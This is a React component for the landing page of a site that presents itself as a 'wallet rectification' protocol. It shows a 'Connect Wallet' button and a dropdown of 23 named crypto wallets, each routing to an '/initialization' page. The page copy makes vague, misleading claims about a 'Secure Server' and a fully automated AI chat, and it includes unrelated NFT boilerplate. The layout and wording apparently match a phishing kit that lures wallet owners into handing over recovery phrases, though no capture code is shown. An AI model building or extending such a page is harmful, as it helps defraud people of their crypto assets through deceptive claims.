import React, { useReducer, useState } from 'react'
import BlocknodeRectification from "../assets/BlocknodeRectification.png"
import {BsFillArrowDownCircleFill} from "react-icons/bs"
import { RiArrowDownSLine, RiArrowUpSLine } from "react-icons/ri";
import { Link } from 'react-router-dom'
import Aktionariat from "../assets/Aktionariat.png"
import MetaMask from "../assets/MetaMask.png"
import Trust from "../assets/Trust.png"
import Phantom from "../assets/Phantom.png"
import Coinbase from "../assets/Coinbase.png"
import CryptoCom from "../assets/CryptoCom.png"
import Blockchain from "../assets/Blockchain.png"
import Binance from "../assets/Binance.png"
import Safepal from "../assets/Safepal.png"
import Ledger from "../assets/Ledger.png"
import Argent from "../assets/Argent.png"
import Bitkeep from "../assets/Bitkeep.png"
import Starkpoint from "../assets/Starkpoint.png"
import Ownbit from "../assets/Ownbit.png"
import InfinityWallet from "../assets/InfinityWallet.png"
import WalletIo from "../assets/WalletIo.png"
import Infinito from "../assets/Infinito.png"
import Torus from "../assets/Torus.png"
import bitPay from "../assets/bitPay.png"
import Imtoken from "../assets/Imtoken.png"
import OtherWallets from "../assets/OtherWallets.png"
import fortmatic from "../assets/fortmatic.png"
import KeyringPro from "../assets/KeyringPro.png"
import { initialState, reducer } from '../../reducer/useReducer';

const wallets = [{
  "icon":MetaMask,
  'title':'MetaMask'
},
{
  "icon":Trust,
  'title':'Trust'
},{
  "icon":Phantom,
  'title':'Phantom'
},{
  "icon":Coinbase,
  'title':'Coinbase'
},{
  "icon":CryptoCom,
  'title':'CryptoCom'
},{
  "icon":Blockchain,
  'title':'Blockchain'
},{
  "icon":Binance,
  'title':'Binance'
},{
  "icon":Safepal,
  'title':'Safepal'
},{
  "icon":Ledger,
  'title':'Ledger'
},{
  "icon":Argent,
  'title':'Argent'
},{
  "icon":fortmatic,
  'title':'fortmatic'
},{
  "icon":Aktionariat,
  'title':'Aktionariat'
},{
  "icon":KeyringPro,
  'title':'KeyringPro'
},{
  "icon":Bitkeep,
  'title':'Bitkeep'
},{
  "icon":Starkpoint,
  'title':'Starkpoint'
},{
  "icon":Ownbit,
  'title':'Ownbit'
},{
  "icon":InfinityWallet,
  'title':'InfinityWallet'
},{
  "icon":WalletIo,
  'title':'WalletIo'
},{
  "icon":Infinito,
  'title':'Infinito'
},{
  "icon":Torus,
  'title':'Torus'
},{
  "icon":bitPay,
  'title':'bitPay'
},{
  "icon":Imtoken,
  'title':'Imtoken'
},{
  "icon":OtherWallets,
  'title':'OtherWallets'
},]

const Hero = () => {
  const [dropDown,setDropDown] = useState(false)

  const [state,dispatch] = useReducer(reducer,initialState)

  const connectWallet = (icon,title) => {
    dispatch({action:"CONNECT_WALLET",payload:{icon,title}})
    console.log(state)
  }

  return (
      <div className='container mx-auto p-8 mt-10 min-h-[100vh]'>
        <div className='sm:w-full md:w-[70%] mx-auto mb-5'>
          <img src={BlocknodeRectification} alt="hero.png" className='w-full' />
        </div>
      <div className='w-95 mx-auto my-5 text-white text-center p-2'>
        <p className='mb-8'>Every digital artwork on Upside is authentic and truly unique.</p>

        <p className='mb-8'>Blockchain technology makes this new approach to digital ownership possible.<br/>
        Open and decentralized protocol for syncing various Wallets issues on Secure Server.</p>

        <p className='mb-8'>This is not an app but a protocol that establishes a remote resolution<br/>
        between all noncustodial wallet It is an online server which gets you across to every wallet <br/>representative to enable effective complain and rectification of issues.</p>

        <p className='mb-8'>You will be on a chat with an Artificial Intelligence Robot with zero Human interference.</p>
      </div>
      <div className='flex flex-col md:flex-row gap-y-3 justify-between md:w-[50%] mx-auto'>
        <Link to="/connectwallet" className='py-3 px-4 lg:px-8 md:w-[48%] bg-[rgba(0,201,32,1)] rounded-full font-bold hover:text-[rgba(0,201,32,1)] hover:bg-white text-center'>Connect Wallet</Link>
        <div className='md:w-[48%] relative'>
          <button className='pl-5 pr-1 py-1 w-full  lg:gap-x-4 bg-transparent rounded-full font-bold inline-flex justify-between text-[rgba(0,201,32,1)] ring-1 ring-inset ring-[rgba(0,201,32,1)] items-center' onClick={()=>setDropDown(!dropDown)} >Select Chain {dropDown?<RiArrowUpSLine className='text-4xl bg-[rgba(0,201,32,1)] text-white rounded-full'/>:<RiArrowDownSLine className='text-4xl bg-[rgba(0,201,32,1)] text-white rounded-full'/>}</button>
          {dropDown && <div className='bg-[#0F0F0F] border border-[rgba(48,48,48,0.9)] rounded-xl h-56 overflow-hidden overflow-y-auto absolute top-14 left-0 right-0 scrollbar scrollbar-thin scrollbar-thumb-[rgba(0,201,32,1)]'>
              {wallets.map((item,index)=>{
                const {icon,title} = item
              return (
                <Link to={`/initialization/${index}`} className='flex justify-between px-6 py-3 mb-2 cursor-pointer items-center hover:bg-[rgba(48,48,48,0.9)]' key={index} onClick={()=>connectWallet(icon,title)}>
                  <h5 className='text-white font-semibold'>{title}</h5>
                  <div className='w-[25px] h-[25px]'>
                      <img src={icon} alt="logo.png" className='w-full' />
                  </div>
              </Link>
              )
              })}
          </div>}
        </div>
      </div>
      </div>
  )
}

export default Hero
